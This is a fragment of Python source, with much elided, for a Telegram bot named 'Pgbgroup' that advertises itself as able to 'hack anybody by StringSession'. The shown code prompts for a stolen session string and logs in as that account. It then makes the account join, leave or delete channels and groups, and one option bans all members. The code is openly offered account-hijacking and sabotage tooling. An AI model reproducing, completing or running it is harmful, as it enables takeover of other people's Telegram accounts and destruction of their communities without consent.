...
client = TelegramClient('Pgbgroup', api_id, api_hash).start(bot_token=token)
...
'''
mm = '''
You can hack anybody by StringSession by Command:/hack
'''
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      await event.reply("Banning all members Thanks For using Pgbgroup Bot")
    elif r == "D":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Thanks For using Pgbgroup Bot")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Thanks For using Pgbgroup Bot")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Thanks For using Pgbgroup Bot")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @Gauthambala\n**LOGS**\n" + str(e))
